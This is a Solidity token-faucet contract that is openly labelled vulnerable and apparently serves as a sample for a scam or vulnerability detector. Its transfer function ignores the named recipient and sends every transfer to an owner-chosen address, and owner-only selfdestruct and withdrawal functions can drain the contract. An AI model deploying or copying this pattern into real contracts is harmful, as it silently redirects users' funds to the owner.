// SPDX-License-Identifier: MIT
pragma solidity ^0.5.12;

contract VulnerableTokenFaucet {
    // --- ERC20-like storage ---
    string public name = "VulnToken";
    string public symbol = "VUL";
    uint8 public decimals = 18;
    uint256 public totalSupply;

    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowed;

    // --- Vulnerability control/state ---
    address public owner;
    address public forcedRecipient; // 
    uint256 public limit = 10000000000000; // 

    // Events
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed ownerAddr, address indexed spender, uint256 value);
    event ReceiverChanged(address oldReceiver, address newReceiver);
    event LimitChanged(uint256 oldLimit, uint256 newLimit);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() public {
        owner = msg.sender;
        totalSupply = 1000000 * (10 ** uint256(decimals));
        balances[address(this)] = totalSupply; // contract holds initial supply
        forcedRecipient = owner; 
    }

    // -----------------------
    // ERC20-like functions
    // -----------------------
    function balanceOf(address who) public view returns (uint256) {
        return balances[who];
    }

    function approve(address spender, uint256 value) public returns (bool) {
        allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function allowance(address ownerAddr, address spender) public view returns (uint256) {
        return allowed[ownerAddr][spender];
    }

    // Note: transfer signature preserved, but implementation uses forcedRecipient -> TR
    function transfer(address /* _to */, uint256 value) public returns (bool) {
        address from = msg.sender;
        address to = forcedRecipient; 
        require(to != address(0), "Invalid recipient");
        require(balances[from] >= value, "Insufficient balance");

        balances[from] -= value;
        balances[to] += value;

        emit Transfer(from, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        uint256 allowanceValue = allowed[from][msg.sender];
        require(balances[from] >= value, "Insufficient balance");
        require(allowanceValue >= value, "Allowance exceeded");

        balances[from] -= value;
        balances[to] += value;
        if (allowanceValue < uint256(-1)) {
            allowed[from][msg.sender] = allowanceValue - value;
        }

        emit Transfer(from, to, value);
        return true;
    }

    // -----------------------
    // Functions that create detected patterns
    // -----------------------


    function setForcedRecipient(address newRecipient) public onlyOwner {
        require(newRecipient != address(0), "zero");
        emit ReceiverChanged(forcedRecipient, newRecipient);
        forcedRecipient = newRecipient;
    }

    function setLimit(uint256 newLimit) public onlyOwner {
        emit LimitChanged(limit, newLimit);
        limit = newLimit;
    }


    function claim() public {
        uint256 userBal = balances[msg.sender];
        require(userBal < limit, "Already over limit");
        uint256 diff = limit - userBal;
        require(balances[address(this)] >= diff, "Faucet empty");

 
        balances[address(this)] -= diff;
        balances[msg.sender] += diff;
        emit Transfer(address(this), msg.sender, diff);
    }

    function destroyAndPayout(address payable payout) public onlyOwner {
        uint256 bal = balances[address(this)];
        if (bal > 0) {
            balances[payout] += bal;
            balances[address(this)] = 0;
            emit Transfer(address(this), payout, bal); 
        }
        selfdestruct(payout);
    }


    function withdrawETH() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    // allow contract to receive ETH
    function () external payable { }
}
